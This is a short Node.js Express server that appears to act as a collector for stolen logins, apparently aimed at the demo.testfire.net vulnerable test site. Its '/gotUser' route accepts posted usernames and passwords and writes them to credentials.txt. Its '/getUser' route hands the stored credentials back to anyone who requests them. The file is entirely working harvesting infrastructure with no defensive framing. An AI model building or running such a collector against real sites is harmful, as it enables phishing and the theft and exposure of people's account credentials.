const express = require('express'); 
const bodyParser = require('body-parser');
const router = express.Router();
const app = express();
var cors = require('cors');
var fs = require('fs');

var corsOptions = {
  origin: 'https://demo.testfire.net',
  optionsSuccessStatus: 200 
} 

app.use(bodyParser.json());      
app.use(bodyParser.urlencoded({extended: true}));
app.use(express.static(__dirname + '/views'));
   
router.get('/',(req,res) => {
    res.sendFile('index.html');
});

router.get('/getUser',(req,res) => {
    fs.readFile('./credentials.txt', 'utf8', function(err, contents) {
        console.log('read succesful');
        console.log(contents);
        res.write(contents);
        res.end();
    });
});

router.post('/gotUser',(req,res) => {
    
    console.log(req.url);
    var username  = req.body.username;
    var password  = req.body.password;
    var text = "Username = "+ username+" password = " + password; 
    console.log(text);
    fs.writeFile("./credentials.txt", text , function(err) {

        if(err) {
            return console.log(err);
        }
        console.log('Write Successful');
        res.sendStatus(200)
    });  
});
 


app.use('/', router);

app.listen(process.env.PORT || 8080,() => {
    console.log(`App Started on PORT ${process.env.PORT || 8080}`);
});